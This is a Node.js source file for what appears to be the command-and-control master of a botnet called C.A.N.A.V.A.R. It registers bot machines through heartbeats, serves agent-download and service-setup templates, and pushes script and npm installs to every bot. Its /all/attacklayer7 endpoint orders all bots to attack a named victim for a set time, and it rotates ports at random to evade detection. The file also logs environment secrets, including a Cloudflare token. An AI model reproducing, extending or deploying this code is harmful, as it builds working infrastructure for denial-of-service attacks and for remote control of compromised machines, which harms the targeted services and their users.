//npm install express json-server isomorphic-fetch axios events delay random-number-csprng moment crypto
process.on('uncaughtException', function (err) {
    console.log('Caught exception: ' + err);
});
process.chdir(__dirname)
const dotenv_ = require('dotenv')
const dotenv = dotenv_.config().parsed
const { exec } = require('child_process');
let initSign = `${Date.now()}`
const logger = require('./logger.js').log
logger.init(initSign, "Initiating...")
logger.init(initSign, "Environment variables recieved as : " + JSON.stringify(dotenv))
const express = require('express')
logger.init(initSign, "Called 'express'")
const app = express()
logger.init(initSign, "Initiated 'express'")
const jsonServer = require('json-server')
logger.init(initSign, "Called 'json-server'")
const jServer = jsonServer.create()
logger.init(initSign, "Created 'json-server'")
const router = jsonServer.router('db.json')
logger.init(initSign, "Called 'json-server' router")
const middlewares = jsonServer.defaults()
const fetch = require('isomorphic-fetch')
logger.init(initSign, "Called 'isomorphic-fetch'")
const axios = require('axios').default;
logger.init(initSign, "Called 'axios'")
let config = require('./config.json')
logger.init(initSign, "Called config.")
const EventEmitter = require('events')
logger.init(initSign, "Called 'events'")
const delay = require('delay')
logger.init(initSign, "Called 'delay'")
const randomInt = require("random-number-csprng");
logger.init(initSign, "Called 'random-number-csprng'")
const moment = require('moment')
logger.init(initSign, "Called 'moment'")
const crypto = require('crypto')
logger.init(initSign, "Called 'crypto'")
const callerId = require('caller-id');
logger.init(initSign, "Called 'caller-id'")
const bodyParser = require('body-parser');
const si = require('systeminformation');

console.log(process);

let systemInfo = {
    static: null,
    dynamic: {
        cpu: {
            brand: null,
            speed: null,
            voltage: null
        },
        mem: {
            total: null,
            free: null,
            used: null,
            active: null,
            available: null
        },
        load: null,
        net: null
    }
}



let Globals = {
    port: {
        number: null,
        changeAt: null,
        changedLast: null,
        changeTo: null,
        last: null
    },
    restart: {
        scheduled: false,
        at: null,
        last: null
    },
    lockdown: true,
    accessKey: null,
    latestGlobalsWrite: null,
    latestGlobalsDump: null,
}

let database = {
    globals: "http://localhost:3000/global/",
    setup: "http://localhost:3000/setup/",
    scripts: "http://localhost:3000/scripts/",
    machines: "http://localhost:3000/machines/",
    settings: "http://localhost:3000/settings/",
}

let slaveInfo = {
    scripts: null,
    setup: null
}

let Machines = {
    all: {

    },
    has: function (mid) {
        if (Machines.all[mid]) {
            return true
        }
    },
    get: function (mid) {
        if (Machines.all[mid]) {
            return Machines.all[mid]
        } else {
            return { null: null }
        }
    },
    clean: function () {
        Machines.all = {}
    },
    count: function() {
        return (Object.keys(Machines.all)).length
    }
}

si.getDynamicData(function (data) {
    systemInfo.dynamic.all = data
})

let initiated = true
let AGENTLINK = null
let SERVICELINK = null
let SERVICENAME = null
let SCRIPTS = null
let activeMachinesList = []
let activemachinesindb = []

const databaseInitiated = new EventEmitter()

function logID() {
    return crypto.randomBytes(5).toString('hex');
}

jServer.use((req, res, next) => {
    if (req.hostname === "localhost") {
        next()
    } else {
        if (req.method === "POST") {
            if ((req.headers.accesskey)) {
                if ((config.pk).includes(req.headers.accesskey)) {
                    //console.log("approve");
                    next()
                } else {
                    res.send(403)
                }
            } else {
                res.send(403)
            }
        } else {
            next();
        }
    }

})

app.use((req, res, next) => {
    if (initiated) {
        let area = ((req.originalUrl).split("/")[1]);
        if (area === "mgmt") {
            if ((req.headers.accesskey)) {
                if ((config.pk).includes(req.headers.accesskey)) {
                    //console.log("approve");
                    next()
                } else {
                    res.send(403)
                }
            } else {
                res.send(403)
            }
        } else {
            next()
        }
    }
    else {
        res.send(500, {
            error: {
                message: "MASTER_IS_INITIATING",
                innerResponse: `The master had started at ${initSign}`
            }
        })
    }
})

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(bodyParser.raw());

jServer.use(middlewares)
jServer.use(router)

jServer.listen(3000, () => { console.log("dbok"); databaseInitiated.emit('true') })

databaseInitiated.on('true', async () => {
    console.log("Begin init.");
    await fetchGlobals()
    await fetchConfig()
    await fetchSlaveSetup()
    await fetchScripts()
    updateMasterSubdomain()
    await checkPortExpiry()
    await dbMachineCleanup()
    console.log("End init.");
})

async function fetchConfig() {
    return axios.get(database.settings)
        .then(resx => {
            config = resx.data
        })
        .catch(err => {

        })
}

async function fetchGlobals() {
    return axios.get(database.globals, { timeout: 4000 })
        .then(res => {
            Globals = res.data
        })
        .catch(err => {
            fetchGlobals()
        })
}

async function dbMachineCleanup() {
    return axios.get(database.machines)
        .then(async (res) => {
            let machines = res.data
            async function delall() {
                for (let index = 0; index < machines.length; index++) {
                    const element = machines[index];
                    await axios.delete(`${database.machines}${element.id}`)
                        .then(res => {
                            //console.log(res)
                        })
                        .catch(err => {
                            console.error(err);
                        })
                }
            }
            await delall()
            return
        })
        .catch(err => {
            console.error(err);
        })
}

async function fetchSlaveSetup() {
    return axios.get(database.setup)
        .then(res => {
            slaveInfo.setup = res.data
            console.log("Setups loaded.");
        })
        .catch(err => {
            console.error(err);
        })
}

async function fetchScripts() {
    return axios.get(database.scripts)
        .then(res => {
            slaveInfo.scripts = res.data
            console.log("Scripts loaded.");
        })
        .catch(err => {
            console.error(err);
        })
}

function updateMasterSubdomain() {
    let traceid = logID()
    if (config.domainConnection) {
        logger.info(traceid, "Updating Master Subdomain", `Begun`)
        axios.get("http://icanhazip.com")
            .then(res => {
                let currentIP = res.data
                logger.info(traceid, "Updating Master Subdomain", `Current IP recieved as ${currentIP}`)
                var options = {
                    method: 'PUT',
                    url: `https://api.cloudflare.com/client/v4/zones/${dotenv.CFZI}/dns_records/${dotenv.CFDR}`,
                    headers: { Authorization: 'Bearer ' + dotenv.CFPT, 'Content-Type': 'application/json' },
                    data: { type: 'A', name: 'master.api.canavar.licentia.xyz', content: currentIP, ttl: 1, proxied: true }
                };
                axios.request(options).then(function (response) {
                    logger.info(traceid, "Updated Master Subdomain", `Updated the subdomain to IP ${currentIP}`)
                }).catch(function (error) {
                    logger.info(traceid, "Couldn't Update Master Subdomain", `Tried to update the subdomain to IP ${currentIP}`)
                    console.error(error);
                });
            })
            .catch(err => {
                console.error(err);
                logger.info(traceid, "Couldn't Update Master Subdomain", `Error was : ${err}`)
            })
    } else {
        logger.info(traceid, "Updating Master Subdomain", `Aborted because config prevents automatic subdomain heartbeats.`)
    }
}

async function checkPortExpiry() {
    console.log(Globals);
    if (Globals.port.changeAt <= Date.now()) {
        Globals.port.last = (Globals.port.number)
        Globals.port.number = (Globals.port.changeTo)
        Globals.port.changedLast = (Date.now())
    }
}

async function changePort(newport, logid) {
    logger.info = (logid, "Changing port.", "Response for the current settings recieved.")
    Globals.port.last = (Globals.port.number)
    Globals.port.number = (newport)
    Globals.port.changedLast = (Date.now())
    logger.info(logid, "Changed port.", `Successfuly switched to port ${Globals.port.number}.`)
}

async function schedulePortChange(mins, np, logid) {
    let inMinutes = mins || config.defaultPortReplenishTimeMin
    let newPort = np || await randomInt(1000, 9999)
    logger.info(logid, "Port change schedule requested.", `Scheduling change to port ${newPort} in ${inMinutes} minutes.`)
    Globals.port.changeAt = (moment().add({ minutes: inMinutes }).unix() * 1000)
    Globals.port.changeTo = (newPort)
    logger.info(logid, "Port change schedule request.", `Successfuly scheduled to port ${newPort} in ${inMinutes} minutes..`)
}

app.get('/', (req, res) => {
    let ref = (req.headers.host);
    if (ref === "127.0.0.1") {

    }
    res.send(200, "OKAY")
})

app.get('/scripts', (req, res) => {
    let scid = ([Object.keys(req.query)[0]][0]);
    //console.log(scid);
    if (scid === undefined) {
        res.send(200, slaveInfo.scripts)
    } else {
        let allScripts = slaveInfo.script
        for (let index = 0; index < allScripts.length; index++) {
            const cScript = allScripts[index];
            if (cScript.id === scid) {
                res.send(cScript)
                return
            }
        }
        res.send(500, {
            error: {
                message: "SCRIPT_DOES_NOT_EXIST",
                innerResponse: `SCRIPT_DOES_NOT_EXIST`
            }
        })
    }
})

app.get('/setup', (req, res) => {
    let scid = ([Object.keys(req.query)[0]][0]);
    let detid = ([Object.keys(req.query)[1]][0]);
    //console.log(scid, detid);
    if (scid === undefined) {
        res.send(200, slaveInfo.setup)
    } else {

        let requested = (slaveInfo.setup)[scid]
        if (requested.includes("$")) {
            if (scid === "download_agent") {
                res.send(200, (requested.replace("$AGENTLINK;", AGENTLINK)))
            } else if (scid === "service_setup") {
                requested = requested.replace("$SERVICELINK", SERVICELINK)
                var regex = new RegExp("SERVICENAME", "g");
                requested = requested.replace(regex, SERVICENAME)
                res.send(200, (requested))
            } else if (scid === "download_script") {
                let searchSatisfied = false
                for (let index = 0; index < SCRIPTS.length; index++) {
                    const element = SCRIPTS[index];
                    if (element.id === detid) {
                        //console.log(element);
                        searchSatisfied = true
                        requested = requested.replace("$SCRIPTLINK", element.source)
                        requested = requested.replace("$SCRIPTNAME", element.filename)
                        res.send(requested)
                    }
                }
                if (!searchSatisfied) {
                    res.send(500, {
                        error: {
                            message: "SCRIPT_DOES_NOT_EXIST",
                            innerResponse: `The script with ID'${detid}' does not exist in the dictionary.`
                        }
                    })
                }
                requested = requested.replace("$SERVICELINK", SERVICELINK)
                var regex = new RegExp("SERVICENAME", "g");
                requested = requested.replace(regex, SERVICENAME)
                //res.send(200, (requested))
            }
        }
        /*
        .catch(err => {
            if (scid === "script_json") {
                let searchSatisfied = false
                for (let index = 0; index < SCRIPTS.length; index++) {
                    const element = SCRIPTS[index];
                    if (element.id === detid) {
                        //console.log(element);
                        searchSatisfied = true
                        res.send(element)
                    }
                }
                if (!searchSatisfied) {
                    res.send(500, {
                        error: {
                            message: "SCRIPT_DOES_NOT_EXIST",
                            innerResponse: `The script with ID'${detid}' does not exist in the dictionary.`
                        }
                    })
                }
            }
            else {
                console.log(err);
                res.send(500, { error: { message: err.message } })
            }
        })*/
    }

})


app.get('/globals', (req, res) => {
    Globals.port.leftForChange = ((Globals.port.changeAt) - (Date.now()))
    Globals.port.shouldChange = (Globals.port.changeAt <= Date.now())
    res.send(200, Globals)
})

app.post('/heartbeat', (req, res) => {
    let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
    ip = ip.toString().replace('::ffff:', '');
    let machine = req.body.machine
    Machines.all[ip] = {
        id: ip,
        machine
    }
    res.send(200, Globals)

    /*if (!activemachinesindb.includes(ip)) {
        let currentMachineData = req.body.machine
        axios.post(database.machines, { id: ip, currentMachineData })
            .then(resp => {
                res.send(200, Globals)
                activemachinesindb.push(ip)
            })
            .catch(err => {
                console.error(err);
                res.send(500, {
                    error: {
                        message: "DATABASE_ERR",
                        innerResponse: err.message
                    }
                })
            })
    } else {
        let currentMachineData = req.body.machine
        axios.patch(`${database.machines}${ip}`, { currentMachineData })
            .then(resp => {
                res.send(200, Globals)
            })
            .catch(err => {
                console.error(err);
                res.send(500, {
                    error: {
                        message: "DATABASE_ERR",
                        innerResponse: err.message
                    }
                })
            })
    }*/
})

app.patch('/heartbeat', (req, res) => {
    let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
    ip = ip.toString().replace('::ffff:', '');
    let machine = req.body.machine
    Machines.all[ip] = {
        id: ip,
        machine
    }
    res.send(200, Globals)
})

app.get('/all/installscript/:scriptid', (req, res) => {
    for (let index = 0; index < Machines.count(); index++) {
        axios.get(`http://${activeMachinesList[index]}:${Globals.port.number}/installScript/${req.params.scriptid}`)
            .then(res => {
                console.log(res.data)
            })
            .catch(err => {
                console.error(err);
            })

    }
    res.send(200, "OKAY")
})
app.get('/all/npminstall/:module', (req, res) => {
    for (let index = 0; index < Machines.count(); index++) {
        axios.get(`http://${activeMachinesList[index]}:${Globals.port.number}/npminstall/${req.params.module}`)
            .then(res => {
                console.log(res.data)
            })
            .catch(err => {
                console.error(err);
            })

    }
    res.send(200, "OKAY")
})

app.get('/all/attacklayer7/:methodID/:victim/:time/:attackID', async (req, res) => {
    let machines = {
        all: activeMachinesList,
        asked: [],
        responded: [],
        busy: []
    }
    for (let index = 0; index < Machines.count(); index++) {
        machines.asked.push(activeMachinesList[index])
        axios.get(`http://${activeMachinesList[index]}:${Globals.port.number}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
            .then(res => {
                console.log(res.data)
                machines.responded.push(activeMachinesList[index])
            })
            .catch(err => {
                console.error(err.response.data);
                machines.busy.push(activeMachinesList[index])
            })
    }
    await delay(3000)
    res.send(200, { asked: machines.asked.length, responded: machines.responded.length, busy: machines.responded.busy, data: machines })
})

app.get('/all/update', (req, res) => {
    for (let index = 0; index < Machines.count(); index++) {
        axios.get(`http://${activeMachinesList[index]}:${Globals.port.number}/update`)
            .then(res => {
                console.log(res.data)
            })
            .catch(err => {
                console.error(err.response.data);
            })

    }
    res.send(200, "OKAY")
})

app.get('/machines/', (req, res) => {
    res.send(200, Machines.all)
})
app.get('/machines/list', (req, res) => {
    let macar = []
    for (const key in Machines.all) { macar.push(Machines.all[key]) }
    res.send(200, macar)
})
app.get('/machines/:machid', (req, res) => {
    res.send(200, Machines.get([req.params.machid]))
})
app.get('/machines/testReachability/:timeout', async (req, res) => {
    let reachable = []
    let unreachable = []
    let timeout_ = 5
    if (!isNaN(req.params.timeout)) {
        if (req.params.timeout <= 10)
            timeout_ = parseInt(req.params.timeout)
    }
    for (let index = 0; index < Machines.count(); index++) {
        axios.get(`http://${activeMachinesList[index]}:${Globals.port.number}/status`, {
            timeout: timeout_ * 1000,
        })
            .then(res => {
                reachable.push(activeMachinesList[index])
            })
            .catch(err => {
                unreachable.push(activeMachinesList[index])
            })
    }
    await delay(((timeout_ + 1) * 1000))
    res.send(200, {
        reachable: {
            count: reachable.length, all: reachable
        },
        unreachable: {
            count: unreachable.length, all: unreachable
        },
    })
})

app.post('/mgmt/changePort/:newPort', async (req, res) => {
    let logid = crypto.randomBytes(5).toString('hex');
    logger.info(logid, "API POST Request", "Port change requested.")
    if (isNaN(req.params.newPort)) {
        logger.info(logid, "Port change requested.", "Requested port isNaN, defaulting to random.")
        //interactive.await('[%d/4] - Requested port is not a number, defaulting to a random port.', 1);
        let newPort = await randomInt(1000, 9999)
        changePort(newPort, logid)
        logger.info(logid, "Port change requested.", "Successfuly switched to port " + newPort)
    } else {
        logger.info(logid, "Port change requested.", `Requested port is ${req.params.newport}, defaulting to random.`)
        changePort(req.params.newPort, logid)
    }
    res.send(200)
})

app.post('/mgmt/database', async (req, res) => {
    res.sendFile(__dirname + '/db.json');
})

app.post('/mgmt/schedulePortChange/:newPort/:inMins', async (req, res) => {
    let logid = crypto.randomBytes(5).toString('hex');
    logger.info(logid, "API POST Request", "Port change schedule requested.")
    if (isNaN(parseInt(req.params.newPort)) || isNaN(parseInt(req.params.inMins))) {
        logger.error(logid, "Port change schedule requested.", "Invalid parameters. Rejecting request.")
        res.send(500, {
            error: {
                message: "INVALID_USAGE",
                innerResponse: `usage: schedulePortChange/:newPort/:inMins`
            }
        })
    } else {
        logger.info(logid, "Port change schedule requested.", `Scheduling port change for port ${req.params.newPort} in ${req.params.inMins} minutes.`)
        schedulePortChange(parseInt(req.params.inMins), parseInt(req.params.newPort), logid)
        res.send(200)
    }
})

app.get('/mgmt/systemInfo', async (req, res) => {
    let systemInfo_ = systemInfo
    si.mem(function (memdata) {
        systemInfo_.dynamic.mem.total = memdata.total
        systemInfo_.dynamic.mem.free = memdata.free
        systemInfo_.dynamic.mem.used = memdata.used
        systemInfo_.dynamic.mem.active = memdata.active
        systemInfo_.dynamic.mem.available = memdata.available
        si.cpu(function (cpudata) {
            systemInfo_.dynamic.cpu.voltage = cpudata.voltage
            systemInfo_.dynamic.cpu.speed = cpudata.speed
            systemInfo_.dynamic.cpu.brand = cpudata.brand
            si.currentLoad(function (data) {
                systemInfo_.dynamic.load = data
                si.networkStats(function (data) {
                    systemInfo_.dynamic.net = data
                    res.send(200, systemInfo_)
                })
            })
        })
    })
})

app.post('/mgmt/update', (req, res) => {
    res.send(200)
    exec("cd /C.A.N.A.V.A.R/ ; git pull; cd master ; npm install; nohup systemctl restart canavarmaster &", (err, stdout, stderr) => {
        if (err) {
            //some err occurred
            console.error(err)
            res.send(500, { std_err: err })
        } else {
            // the *entire* stdout and stderr (buffered)

            res.send(200, { std_out: stdout, std_err: stderr })
        }
    })
})

app.post('/mgmt/vcontrol', (req, res) => {
    exec("cd /C.A.N.A.V.A.R/ ; git show -1 --stat  ", (err, stdout, stderr) => {
        if (err) {
            //some err occurred
            console.error(err)
            res.send(200, { std_err: err })
        } else {
            // the *entire* stdout and stderr (buffered)
            let stdout_ = stdout
            if (stdout.length > 10) {
                var options = {
                    method: 'GET',
                    url: 'https://api.github.com/repos/mehmetefeerkan/C.A.N.A.V.A.R/commits',
                    headers: { Accept: 'application/vnd.github.v3+json' }
                };

                axios.request(options).then(function (response) {
                    let resp = response.data
                    let latestCommitSHA = resp[0].sha
                    if ((latestCommitSHA === (null || undefined || ""))) {
                        res.send(500, {
                            error: {
                                message: "INVALID_COMMIT_SHA_RECIEVED",
                                innerResponse: `Given SHA was${latestCommitSHA}`
                            }
                        })
                    } else {
                        if (stdout_.includes(latestCommitSHA)) {
                            res.send(200, { upToDate: true, latestCommit: resp[0], currentCommitData: stdout_ })
                        } else {
                            res.send(200, { upToDate: false, latestCommit: resp[0], currentCommitData: stdout_ })
                        }
                    }
                }).catch(function (error) {
                    console.error(error);
                });
            }
            //res.send(200, {std_out: stdout, std_err: stderr})x
        }
    })
})

app.post('/mgmt/portElusion/', async (req, res) => {
    globalLock = true;
    let newPort = await randomInt(1000, 9999)
    Globals.port.last = (Globals.port.number)
    Globals.port.changedLast = (Date.now())
    Globals.port.number = (newPort)
    res.send(200)
    globalLock = false;
})

app.listen(80, () => console.log(`App listening on port ${"80"}!`))


